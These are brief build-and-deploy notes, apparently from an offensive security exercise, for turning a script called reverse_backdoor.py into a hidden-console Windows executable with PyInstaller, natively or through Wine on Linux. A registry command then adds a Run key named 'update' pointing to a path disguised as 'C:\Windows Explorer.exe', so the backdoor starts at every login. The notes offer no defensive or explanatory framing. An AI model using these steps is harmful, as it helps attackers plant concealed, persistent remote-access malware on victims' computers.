#Windows
1: python -m pip install pyinstaller
2: pyinstaller.exe reverse_backdoor.py --onefile --noconsole

#Linux
1: Download python.msi cho windows
2: Run: wine msiexec /i python-....msi 
3: cd ./wine/drive_c/Python27
4: wine python -m pip install pyinstaller
5: Installs library in file python victim
6: wine pyinstaller.exe reverse_backdoor.py --onefile --noconsole

## Script reg windows start
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "C:\Windows Explorer.exe"
